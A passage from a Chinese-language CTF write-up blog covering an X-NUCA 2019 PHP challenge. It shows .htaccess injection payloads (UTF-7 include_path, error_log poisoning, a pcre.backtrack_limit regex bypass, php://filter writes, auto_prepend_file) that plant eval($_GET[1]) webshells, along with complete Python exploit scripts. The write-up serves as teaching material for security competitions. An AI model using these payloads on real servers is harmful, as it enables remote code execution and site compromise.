</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=nx>Warning</span><span class=o>:</span> <span class=k>include_once</span><span class=p>(</span><span class=nx>fl3g</span><span class=o>.</span><span class=nx>php</span><span class=p>)</span><span class=o>:</span> <span class=nx>failed</span> <span class=nx>to</span> <span class=nx>open</span> <span class=nx>stream</span><span class=o>:</span> <span class=nx>No</span> <span class=nx>such</span> <span class=nx>file</span> <span class=k>or</span> <span class=nx>directory</span> <span class=nx>in</span> <span class=o>/</span><span class=nx>xxx</span><span class=o>/</span><span class=nx>index</span><span class=o>.</span><span class=nx>php</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>10</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=nx>Warning</span><span class=o>:</span> <span class=k>include_once</span><span class=p>()</span><span class=o>:</span> <span class=nx>Failed</span> <span class=nx>opening</span> <span class=s1>&#39;fl3g.php&#39;</span> <span class=k>for</span> <span class=nx>inclusion</span> <span class=p>(</span><span class=nx>include_path</span><span class=o>=</span><span class=s1>&#39;.:/Applications/MAMP/bin/php/php7.1.26/lib/php&#39;</span><span class=p>)</span> <span class=nx>in</span> <span class=o>/</span><span class=nx>xxx</span><span class=o>/</span><span class=nx>index</span><span class=o>.</span><span class=nx>php</span> <span class=nx>on</span> <span class=nx>line</span> <span class=mi>10</span>
</span></span></code></pre></td></tr></table></div></div><p>这时候<code>/tmp/fl3g.php</code>当中的内容也是上面的内容，这时候<code>.htaccess</code>因为我们访问了过一次<code>index.php</code>被删除了，所以我们需要再写一次<code>.htaccess</code>，还是一样的内容。</p><p>接着访问<code>index.php</code>，可以看见我们包含的效果如下：</p><p>Permalink before if: https://blogpic.zdy.one/img/20191003155539.jpg<img src=https://blogpic.zdy.one/img/20191003155539.jpg loading=lazy></p><p>之后我们就要思考怎么把一些恶意代码插到报错的内容当中了。</p><p>既然上面都是通过<code>include</code>不存在的文件产生报错，那我们是不是也可以利用<code>include_path</code>来构造一些错误。</p><p>例如我们可以首先通过这么来构造一个不存在的包含路径让恶意代码插入到<code>/tmp/fl3g.php</code>当中，<code>.htaccess</code>文件内容如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value error_log /tmp/fl3g.php
</span></span><span class=line><span class=cl>php_value include_path &#39;&lt;?php phpinfo();?&gt;&#39;
</span></span></code></pre></td></tr></table></div></div><p>访问<code>index.php</code>我们可以看到：</p><p>Permalink before if: https://blogpic.zdy.one/img/20191003160349.jpg<img src=https://blogpic.zdy.one/img/20191003160349.jpg loading=lazy></p><p>这里<code>&lt;</code>被进行了 html 编码，所以我们这样去用<code>include_path '/tmp'</code>包含的<code>/tmp/fl3g.php</code>，自然也不可能执行代码。所以我们可能需要一些技巧来使得这些可以被解析。</p><p>有了上一题的基础，我们知道可以使用编码来进行解析文件，所以在这里，我们可以先用 UTF-7 编码写入，再利用<code>.htaccess</code>解码 UTF-7</p><p>所以，先尝试利用 UTF-7 编码我们需要插入的恶意代码，写入<code>.htaccess</code>的文件内容如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value error_log /tmp/fl3g.php
</span></span><span class=line><span class=cl>php_value include_path &#39;+ADw?php phpinfo()+ADs?+AD4-&#39;
</span></span></code></pre></td></tr></table></div></div><p>然后访问<code>index.php</code>触发报错写入 log 文件<code>/tmp/fl3g.php</code>，文件内容如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>[03-Oct-2019 16:23:51 Asia/Shanghai] PHP Warning:  include_once(fl3g.php): failed to open stream: No such file or directory in /xxx/index.php on line 10
</span></span><span class=line><span class=cl>[03-Oct-2019 16:23:51 Asia/Shanghai] PHP Warning:  include_once(): Failed opening &#39;fl3g.php&#39; for inclusion (include_path=&#39;+ADw?php phpinfo()+ADs?+AD4-&#39;) in /xxx/index.php on line 10
</span></span></code></pre></td></tr></table></div></div><p>再把以下内容写入<code>.htaccess</code>：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value error_log /tmp/fl3g.php
</span></span><span class=line><span class=cl>php_value include_path &#39;/tmp&#39;
</span></span><span class=line><span class=cl>php_value zend.multibyte 1
</span></span><span class=line><span class=cl>php_value zend.script_encoding &#34;UTF-7&#34;
</span></span></code></pre></td></tr></table></div></div><p>访问<code>index.php</code></p><p>Permalink before if: https://blogpic.zdy.one/img/20191003163200.jpg<img src=https://blogpic.zdy.one/img/20191003163200.jpg loading=lazy></p><p>得到 php-info</p><p>当然这里编码类型有很多，不仅仅只是 UTF-7</p><h3 id=n>\n</h3><p>至于最后的<code>\nJust one chance</code>，因为它影响到了<code>.htaccess</code>文件解析，所以我们首先想到的肯定是利用<code>#</code>注释符将整句话都注视掉，但是又由于有<code>\n</code>换行符的存在，我们不能直接使用<code>#</code>就将其注释掉，需要把<code>\n</code>进行“吃”掉。</p><p>那么最常见的操作就是利用<code>\</code>斜杠将其转义了，这样<code>\\n</code>就是一个简单的<code>\n</code>字符串了。</p><p>Exp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>PAYLOAD1</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;php_value error_log /tmp/fl3g.php
</span></span></span><span class=line><span class=cl><span class=s2>php_value error_reporting 32767
</span></span></span><span class=line><span class=cl><span class=s2>php_value include_path &#34;+ADw?php eval($_GET[1])+ADs?+AD4-&#34;
</span></span></span><span class=line><span class=cl><span class=s2># </span><span class=se>\\</span><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD2</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;php_value include_path &#34;/tmp&#34;
</span></span></span><span class=line><span class=cl><span class=s2>php_value zend.multibyte 1
</span></span></span><span class=line><span class=cl><span class=s2>php_value zend.script_encoding &#34;UTF-7&#34;
</span></span></span><span class=line><span class=cl><span class=s2># </span><span class=se>\\</span><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://xxx/index.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_content</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;content&#34;</span> <span class=p>:</span> <span class=n>content</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filename&#34;</span> <span class=p>:</span> <span class=n>name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rep</span> <span class=o>=</span> <span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;.htaccess&#34;</span><span class=p>,</span> <span class=n>PAYLOAD1</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rep</span> <span class=o>=</span> <span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;.htaccess&#34;</span><span class=p>,</span> <span class=n>PAYLOAD2</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=another-way-pcre>Another Way-Pcre</h3><p>手册中还允许设置 <a class=link href=https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.backtrack-limit target=_blank rel=noopener>pcre.backtrack_limit</a> ，这个可以更改正则回溯的次数，具体可以参考 <a class=link href=https://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html target=_blank rel=noopener>PHP利用PCRE回溯次数限制绕过某些安全限制</a></p><p>这里我们看到题目的代码正则部分是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=k>if</span><span class=p>(</span><span class=nx>preg_match</span><span class=p>(</span><span class=s2>&#34;/[^a-z\.]/&#34;</span><span class=p>,</span> <span class=nv>$filename</span><span class=p>)</span> <span class=o>==</span> <span class=mi>1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=k>echo</span> <span class=s2>&#34;Hacker2&#34;</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=k>die</span><span class=p>();</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></td></tr></table></div></div><p>这里是判断是否为 1 ，如果为 1 则 die ，而根据正则回溯，当超过回溯次数，<code>preg_match</code>会返回<code>false</code>，自然就可以绕过了。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value pcre.backtrack_limit 0
</span></span><span class=line><span class=cl>php_value pcre.jit 0
</span></span></code></pre></td></tr></table></div></div><p>所以我们可以先上传以上内容到<code>.htaccess</code>，利用这个回溯特性可以绕过 filename 的检测，那我们可以对 filename 做点什么操作呢？直接写入 fl3g.php ？走你</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD3</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;php_value pcre.backtrack_limit 0
</span></span></span><span class=line><span class=cl><span class=s2>php_value pcre.jit 0
</span></span></span><span class=line><span class=cl><span class=s2># </span><span class=se>\\</span><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD4</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;&lt;?php phpinfo();?&gt;&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://xxx/index.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_content</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;content&#34;</span> <span class=p>:</span> <span class=n>content</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filename&#34;</span> <span class=p>:</span> <span class=n>name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rep</span> <span class=o>=</span> <span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;.htaccess&#34;</span><span class=p>,</span> <span class=n>PAYLOAD3</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rep</span> <span class=o>=</span> <span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;fl3g.php&#34;</span><span class=p>,</span> <span class=n>PAYLOAD4</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>然后直接访问 fl3g.php 即可。</p><p>ROIS 这里使用了一种比较复杂的方法，首先同样上传<code>.htaccess</code>把 pcre 回溯限制改成 0，然后使用 base64 写文件绕过<code>stristr</code>的判断，使用<code>auto_append_file</code>包含<code>.htaccess</code>，在<code>.htaccess</code>当中写注释 webshell 即可。</p><p>首先上传<code>.htaccess</code>，内容为：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value pcre.backtrack_limit 0
</span></span><span class=line><span class=cl>php_value pcre.jit 0
</span></span></code></pre></td></tr></table></div></div><p>再次上传名为<code>php://filter/write=convert.base64-decode/resource=.htaccess</code>，内容为</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKCnBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCgpwaHBfdmFsdWUgcGNyZS5qaXQgICAwCgojPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c
</span></span></code></pre></td></tr></table></div></div><p>base64 解码的内容是</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>php_value pcre.backtrack_limit    0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>php_value auto_append_file    &#34;.htaccess&#34;
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>php_value pcre.jit   0
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>#&lt;?php eval($_GET[1]);?&gt;\
</span></span></code></pre></td></tr></table></div></div><p>Exp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD5</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;php_value pcre.backtrack_limit 0
</span></span></span><span class=line><span class=cl><span class=s2>php_value pcre.jit 0
</span></span></span><span class=line><span class=cl><span class=s2># </span><span class=se>\\</span><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD6</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;cGhwX3ZhbHVlIHBjcmUuYmFja3RyYWNrX2xpbWl0ICAgIDAKCnBocF92YWx1ZSBhdXRvX2FwcGVuZF9maWxlICAgICIuaHRhY2Nlc3MiCgpwaHBfdmFsdWUgcGNyZS5qaXQgICAwCgojPD9waHAgZXZhbCgkX0dFVFsxXSk7Pz5c&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://zedd.cc/xnuca/index.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_content</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;content&#34;</span> <span class=p>:</span> <span class=n>content</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filename&#34;</span> <span class=p>:</span> <span class=n>name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;1&#34;</span><span class=p>:</span> <span class=s2>&#34;echo &#39;Done!&#39;;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rep</span> <span class=o>=</span> <span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;.htaccess&#34;</span><span class=p>,</span> <span class=n>PAYLOAD5</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rep</span> <span class=o>=</span> <span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;php://filter/write=convert.base64-decode/resource=.htaccess&#34;</span><span class=p>,</span> <span class=n>PAYLOAD6</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><h3 id=another-way-backward-slash>Another Way-backward slash</h3><p>既然能用<code>\</code>绕过最后的<code>\n</code>，同样我们也可以用来绕过<code>stristr</code>，而且不影响<code>.htaccess</code>的解析</p><p>Exp:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=kn>import</span> <span class=nn>requests</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>PAYLOAD7</span> <span class=o>=</span> <span class=s2>&#34;&#34;&#34;php_value auto_prepend_fi</span><span class=se>\\</span><span class=s2>
</span></span></span><span class=line><span class=cl><span class=s2>le &#34;.htaccess&#34;
</span></span></span><span class=line><span class=cl><span class=s2>#&lt;?php phpinfo();?&gt;</span><span class=se>\\</span><span class=s2>&#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>URL</span> <span class=o>=</span> <span class=s2>&#34;http://xxx/index.php&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>upload_content</span><span class=p>(</span><span class=n>name</span><span class=p>,</span> <span class=n>content</span><span class=p>):</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>data</span> <span class=o>=</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;content&#34;</span> <span class=p>:</span> <span class=n>content</span><span class=p>,</span>
</span></span><span class=line><span class=cl>        <span class=s2>&#34;filename&#34;</span> <span class=p>:</span> <span class=n>name</span><span class=p>,</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=n>requests</span><span class=o>.</span><span class=n>get</span><span class=p>(</span><span class=n>URL</span><span class=p>,</span> <span class=n>params</span><span class=o>=</span><span class=n>data</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=n>rep</span> <span class=o>=</span> <span class=n>upload_content</span><span class=p>(</span><span class=s2>&#34;.htaccess&#34;</span><span class=p>,</span> <span class=n>PAYLOAD7</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=nb>print</span><span class=p>(</span><span class=n>rep</span><span class=o>.</span><span class=n>text</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>可以一步到位</p><p>Permalink before if: https://blogpic.zdy.one/img/20191003191545.jpg<img src=https://blogpic.zdy.one/img/20191003191545.jpg loading=lazy></p><h1 id=reference>Reference</h1><p><a class=link href=https://corb3nik.github.io/blog/insomnihack-teaser-2019/l33t-hoster target=_blank rel=noopener>Insomnihack Teaser 2019 / l33t-hoster</a></p><p><a class=link href=https://github.com/mdsnins/ctf-writeups/blob/master/2019/Insomnihack%202019/l33t-hoster/l33t-hoster.md target=_blank rel=noopener>l33t-hoster</a></p><p><a class=link href=https://xz.aliyun.com/t/6111 target=_blank rel=noopener>XNUCA2019 ez系列web题解</a></p><p><a class=link href=https://xz.aliyun.com/t/6101 target=_blank rel=noopener>X-NUCA 2019 线上赛 Writeup By ROIS</a></p></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentcolor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
<span>Licensed under CC BY-NC-SA 4.0</span></section><br><div class="notice tip"><p class=notice-title><span class="icon-notice baseline"><svg viewBox="300.5 134 300 300"><path d="M551.281 252.36c0-3.32-1.172-6.641-3.515-8.985l-17.774-17.578c-2.344-2.344-5.469-3.711-8.789-3.711-3.32.0-6.445 1.367-8.789 3.71l-79.687 79.493-44.141-44.14c-2.344-2.344-5.469-3.712-8.79-3.712-3.32.0-6.444 1.368-8.788 3.711l-17.774 17.579c-2.343 2.343-3.515 5.664-3.515 8.984s1.172 6.445 3.515 8.789l70.704 70.703c2.343 2.344 5.664 3.711 8.789 3.711 3.32.0 6.64-1.367 8.984-3.71l106.055-106.056c2.343-2.343 3.515-5.468 3.515-8.789zM600.5 284c0 82.813-67.188 150-150 150-82.813.0-150-67.188-150-150 0-82.813 67.188-150 150-150 82.813.0 150 67.188 150 150z"/></svg>
</span>Tip</p><p>I am looking for some guys who have a strong interest in CTFs to build a team focused on international CTFs that are on the ctftime.org, if anyone is interested in this idea you can take a look at here: <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>Advertisements</a></p><p>想了解更多有意思的国际赛 CTF 中 Web 知识技巧，欢迎加入我的 <a class=link href=https://zeddyu.github.io/advertisement/#%e7%9f%a5%e8%af%86%e6%98%9f%e7%90%83 target=_blank rel=noopener>知识星球</a> ; 另外我正在召集一群小伙伴组建一支专注国际 CTF 的队伍，如果有感兴趣的小伙伴也可在 <a class=link href=https://zeddyu.github.io/advertisement/#international-ctf-team target=_blank rel=noopener>International CTF Team</a> 查看详情</p></div></footer></article><aside class=related-content--wrapper><h2 class=section-title>Related content</h2><div class=related-content><div class="flex article-list--tile"><article><a href=/p/writeup-for-a-more-secure-pastebin-practical-timeless-timing-in-browser/><div class=article-details><h2 class=article-title>Writeup for A More Secure Pastebin - Practical Timeless Timing in Browser</h2></div></a></article><article><a href=/p/hxp-ctf-2021-the-end-of-lfi/><div class=article-details><h2 class=article-title>hxp CTF 2021 - The End Of LFI?</h2></div></a></article><article><a href=/p/hxp-ctf-2021-a-new-novel-lfi/><div class=article-details><h2 class=article-title>hxp CTF 2021 - A New Novel LFI</h2></div></a></article><article><a href=/p/writeup-for-web-checkin-in-cybrics-ctf-2021-mirror/><div class=article-details><h2 class=article-title>Writeup for Web-Checkin in CyBRICS CTF 2021 (Mirror)</h2></div></a></article><article><a href=/p/two-webs-writeup-in-google-ctf-quals-2021/><div class=article-details><h2 class=article-title>Two Webs' Writeup in Google CTF Quals 2021</h2></div></a></article></div></div></aside><script src=https://giscus.app/client.js data-repo=ZeddYu/ZeddYu.github.io data-repo-id="MDEwOlJlcG9zaXRvcnkzMzgyODQ1OTY=" data-category=Announcements data-category-id=DIC_kwDOFCnQNM4ClsKy data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=top data-theme=light data-lang=en data-loading=lazy crossorigin=anonymous async></script><script>function setGiscusTheme(e){let t=document.querySelector("iframe.giscus-frame");t&&t.contentWindow.postMessage({giscus:{setConfig:{theme:e}}},"https://giscus.app")}(function(){addEventListener("message",t=>{if(event.origin!=="https://giscus.app")return;e()}),window.addEventListener("onColorSchemeChange",e);function e(){setGiscusTheme(document.documentElement.dataset.scheme==="light"?"light":"dark_dimmed")}})()</script><footer class=site-footer><section class=copyright>&copy;
2020 -
2025 Zeddy's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.29.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
<button class="pswp__button pswp__button--share" title=Share></button>
<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
